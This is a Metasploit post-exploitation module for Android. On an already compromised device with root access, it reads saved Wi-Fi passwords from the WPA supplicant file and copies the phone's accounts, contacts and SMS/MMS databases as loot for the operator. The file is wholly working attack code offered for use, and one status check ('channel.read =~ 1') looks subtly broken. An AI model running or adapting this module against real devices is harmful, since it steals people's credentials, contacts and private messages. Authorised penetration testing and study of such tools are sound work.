##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Android Gather',
				'Description'   => %q{ Post Module to gather from an android device },
				'License'       => MSF_LICENSE,
				'Author'        => ['timwr'],
				'Platform'      => [ 'android' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))
	end

	def run
		channel = find_root_channel
		if channel.nil?
			print_error("no root channel")
		else
			store_wifi_psk(channel, "/data/misc/wifi/wpa_supplicant.conf")
			db_files = ['/data/system/users/0/accounts.db', 
						'/data/data/com.android.providers.contacts/databases/contacts2.db',
						'/data/data/com.android.providers.telephony/databases/mmssms.db', ]
			db_files.each do |db_file|
				store_db(channel, db_file)
			end
		end
	end

	def store_db(channel, file) 
		filename = ::File.basename(file)
		tmp = "/data/local/tmp/db"
		cmd = "[ -f #{file} ] && "
		cmd << "cp #{file} #{tmp} && "
		cmd << "chmod 777 #{tmp} && "
		cmd << "echo 1 || "
		cmd << "echo 2\n"
		channel.write(cmd)
		return if channel.read =~ 1

		loot = read_file(tmp)
		lootfile = store_loot(filename, "binary/db", session, loot, file, "Sqlite db file")
		print_good("#{filename} saved at: #{lootfile.to_s}")
	end
	
	def store_wifi_psk(channel, file)
		channel.write("cat #{file}\n")
		loot = channel.read
		loot_file = store_loot("wpa.psk", "text/plain", session, loot, file, "WPA PSK file")
		print_good("wpa-psk file saved at: #{loot_file.to_s}")
	end

	def find_root_channel
		session.channels.each_value do |ch|
			ch.write("id\n")
			output = ch.read
			if output =~ /root/
				return ch
			end
		end
		return nil
	end
end

